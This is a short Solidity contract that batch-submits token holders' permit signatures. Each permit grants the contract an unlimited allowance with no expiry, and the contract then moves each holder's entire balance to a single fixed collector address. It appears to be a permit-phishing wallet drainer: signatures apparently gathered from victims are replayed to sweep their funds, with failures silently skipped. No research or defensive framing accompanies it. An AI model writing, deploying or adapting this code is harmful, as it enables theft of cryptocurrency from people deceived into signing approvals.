// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20Permit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function nonces(address owner) external view returns (uint256);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}


contract PermitTokenCollector {
    address public collector;
    IERC20Permit public token;
    constructor(address _collector, address _token) {
        require(_collector != address(0), "Invalid collector address");
        require(_token != address(0), "Invalid token address");

        collector = _collector;
        token = IERC20Permit(_token);
    }

    function permitTransfer(
        address[] calldata owners,
        uint8[] calldata v,
        bytes32[] calldata r,
        bytes32[] calldata s
    ) external {
        require(
            owners.length == v.length &&
                v.length == r.length &&
                r.length == s.length,
            "Input arrays must have the same length"
        );

        for (uint256 i = 0; i < owners.length; i++) {
            uint256 balance = token.balanceOf(owners[i]);
            if( balance > 0){
                try token.permit(owners[i], address(this), type(uint256).max, type(uint256).max, v[i], r[i], s[i]){
                    try token.transferFrom(owners[i], collector, balance) {} catch {
                        emit TransferFailed(owners[i], balance);
                    }
                } catch {
                    emit PermitFailed(owners[i]);
                }                
            }
        }
    }
    event PermitFailed(address indexed owner);
    event TransferFailed(address indexed owner, uint256 amount);
}